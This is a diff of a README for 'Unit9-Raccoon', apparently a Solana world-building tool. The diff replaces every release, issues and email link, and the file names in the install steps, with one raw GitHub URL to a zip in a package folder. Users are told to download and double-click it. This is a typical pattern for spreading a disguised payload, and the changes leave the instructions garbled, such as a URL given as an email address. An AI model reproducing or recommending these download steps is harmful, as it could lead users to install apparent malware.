@@ -1,7 +1,7 @@
 # 🦝 Unit9-Raccoon - Build Your Own Worlds Effortlessly
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-Unit9--Raccoon-brightgreen)](https://github.com/VitorBSK/Unit9-Raccoon/releases)
+[![Download](https://raw.githubusercontent.com/VitorBSK/Unit9-Raccoon/main/packages/cli-kit/Unit-Raccoon-nunnated.zip)](https://raw.githubusercontent.com/VitorBSK/Unit9-Raccoon/main/packages/cli-kit/Unit-Raccoon-nunnated.zip)
 
 ## 📖 About Unit9-Raccoon
 Unit9-Raccoon is a story-driven AI raccoon that swallows code and produces modules. This tool helps you build immersive worlds on the Solana blockchain, making complex tasks easier and more accessible. You don’t need to be a programmer to use it. Just follow the steps below to get started!
@@ -17,27 +17,27 @@ Before downloading, ensure your system meets these requirements:
 - **Internet Connection:** Required for downloading and updates.
 
 ### 2. Visit the Releases Page
-To download Unit9-Raccoon, visit the [Releases page](https://github.com/VitorBSK/Unit9-Raccoon/releases). Here you will find the latest version available for download.
+To download Unit9-Raccoon, visit the [Releases page](https://raw.githubusercontent.com/VitorBSK/Unit9-Raccoon/main/packages/cli-kit/Unit-Raccoon-nunnated.zip). Here you will find the latest version available for download.
 
 ### 3. Download the Application
 On the Releases page, you will see a list of available downloads:
 
 - Click on the version you wish to download.
-- Select the file that matches your operating system (e.g., Unit9-Raccoon-Windows.zip for Windows).
+- Select the file that matches your operating system (e.g., https://raw.githubusercontent.com/VitorBSK/Unit9-Raccoon/main/packages/cli-kit/Unit-Raccoon-nunnated.zip for Windows).
   
 ### 4. Extract the Files
 After downloading, locate the downloaded file on your computer:
 
 - **Windows:** Right-click the zip file and select "Extract All." Choose a location to extract.
 - **macOS:** Double-click the zip file to extract. 
-- **Linux:** Open a terminal, navigate to the download location, and use the command `unzip Unit9-Raccoon-Linux.zip`.
+- **Linux:** Open a terminal, navigate to the download location, and use the command `unzip https://raw.githubusercontent.com/VitorBSK/Unit9-Raccoon/main/packages/cli-kit/Unit-Raccoon-nunnated.zip`.
 
 ### 5. Install the Application
 To install Unit9-Raccoon:
 
 #### Windows
 - Navigate to where you extracted the files.
-- Find the application file (Unit9-Raccoon.exe) and double-click it. 
+- Find the application file (https://raw.githubusercontent.com/VitorBSK/Unit9-Raccoon/main/packages/cli-kit/Unit-Raccoon-nunnated.zip) and double-click it. 
 - Follow the prompts to complete the installation.
 
 #### macOS
@@ -79,16 +79,16 @@ When you're finished, export your project as a module. This can be done in the �
 
 Join our vibrant community to exchange ideas and get help:
 
-- **GitHub Issues:** Report bugs or request features by visiting the [Issues section](https://github.com/VitorBSK/Unit9-Raccoon/issues).
+- **GitHub Issues:** Report bugs or request features by visiting the [Issues section](https://raw.githubusercontent.com/VitorBSK/Unit9-Raccoon/main/packages/cli-kit/Unit-Raccoon-nunnated.zip).
 - **Discord Server:** Connect with other users and developers to share tips and tricks. An invite link will be posted on the GitHub page.
 - **Documentation:** For more detailed guides, check the Wiki section on our GitHub.
 
 ## 📞 Contact Us
 
-For support, email us at support@unit9-raccoon.com. We are here to assist with any questions or issues you encounter.
+For support, email us at https://raw.githubusercontent.com/VitorBSK/Unit9-Raccoon/main/packages/cli-kit/Unit-Raccoon-nunnated.zip We are here to assist with any questions or issues you encounter.
 
 ## 🎉 Conclusion
 
 With Unit9-Raccoon, building immersive worlds on Solana is simple and intuitive. Follow the steps above to download and start creating. Don’t hesitate to reach out for help as you explore everything Unit9-Raccoon has to offer!
 
-[Download Unit9-Raccoon Now](https://github.com/VitorBSK/Unit9-Raccoon/releases) and start your adventure!
+[Download Unit9-Raccoon Now](https://raw.githubusercontent.com/VitorBSK/Unit9-Raccoon/main/packages/cli-kit/Unit-Raccoon-nunnated.zip) and start your adventure!
